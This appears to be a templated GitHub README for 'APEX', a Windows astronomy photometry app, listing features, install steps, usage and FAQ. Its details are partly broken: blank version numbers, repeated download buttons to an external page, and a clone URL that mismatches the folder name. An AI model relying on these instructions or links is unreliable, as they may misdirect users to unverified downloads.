# APEX - astronomical photometry desktop application 2026

> **APEX is a Windows desktop app for astronomy workflows that guides FITS photometry, light-curve building, and period analysis in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucasgray35/apex-windows-photometry?style=flat-square)](https://github.com/lucasgray35/apex-windows-photometry)

---

<p align="center">
  <a href="https://lucasgray35.github.io/apex-windows-photometry/">
    <img src="https://img.shields.io/badge/Download-APEX%20Latest-brightgreen?style=for-the-badge" alt="Download APEX">
  </a>
</p>

> **[Download APEX v](https://lucasgray35.github.io/apex-windows-photometry/)**

---

[Download Latest Build](https://lucasgray35.github.io/apex-windows-photometry/)

---

## What APEX Does

APEX is a Windows desktop application for astronomers and astrophotographers who want a structured path from FITS image sets to measurable results. It brings together image ingestion, source finding, calibration, and time-series analysis so the workflow from raw observations to usable scientific output requires less manual switching between tools.

The program supports both a graphical workflow and a command-line interface, so it can adapt to hands-on inspection or repeatable automation. Depending on the task, it can be used for master catalog creation, WCS alignment, photometric measurements, color-magnitude work, and period searches, which makes it suitable for observations collected in one session or across multiple nights.

---

## Key Capabilities

- Guided workflow for FITS photometry projects
- Source detection and master catalog generation
- WCS plate solving with internal and external solver support
- Forced aperture photometry with optional PSF photometry
- CMD calibration and isochrone fitting tools
- Light-curve generation, detrending, and multi-night merging
- Period analysis with Lomb-Scargle, PDM, and BLS methods
- GUI and CLI modes for different working styles

---

## Installation

APEX is built for Windows and relies on a Python/PyQt5 stack.

1. Download or clone the repository:
   - `git clone https://github.com/lucasgray35/apex-windows-photometry.git
2. Enter the project folder:
   - `cd APEX_AutomatedPhotometryEXtraction`
3. Install the required Python dependencies for your environment.
4. Start the desktop interface or launch the CLI entry point according to your setup.

If you are using a packaged build, run the included executable or launcher from the downloaded folder.

---

## Usage

A common APEX workflow moves from observation data to analysis in a few clear stages:

1. Load a FITS image or an observation series.
2. Run source detection and build a reference catalog.
3. Apply WCS solving if sky alignment is needed.
4. Perform forced aperture photometry, or switch to PSF photometry when appropriate.
5. Calibrate the resulting data for CMD analysis if required.
6. Build the light curve and apply detrending or merge data from several nights.
7. Run period analysis to inspect variability using the available algorithms.

For command-line work, use the CLI mode to automate repeated processing tasks. For interactive work, use the GUI to step through each stage and inspect results between steps.

---

## Configuration

APEX settings are typically stored in the application environment, GUI preferences, or project-specific working files, depending on how you start it. Common items you may want to review include:

- FITS input paths
- Solver selection for WCS handling
- Photometry method choices
- Calibration and analysis options
- Output locations for catalogs, curves, and plots

If your setup includes a config file, keep it alongside the project or in the application data directory used by your build.

---

## Requirements

- Windows
- Python runtime for source-based use
- PyQt5
- FITS observation data
- Sufficient disk space for image sets, catalogs, and output products
- Optional external solvers or supporting astronomy tools, depending on your workflow

---

## FAQ

**Can APEX be used from both the GUI and the command line?**  
Yes. It includes both interface styles, so you can choose either interactive processing or scripted execution.

**What data format is it designed for?**  
APEX is centered on FITS imagery used in astronomy and astrophotography workflows.

**Does it include tools for calibration and period analysis?**  
Yes. The feature set includes CMD calibration, isochrone fitting, light-curve work, and period analysis tools.

**What should I check if a run does not complete?**  
Review the selected input files, solver configuration, Python environment, and any project output paths before trying again.

**How can I stay current with new builds?**  
Use the repository release or download link provided in this project and review the latest build notes when available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
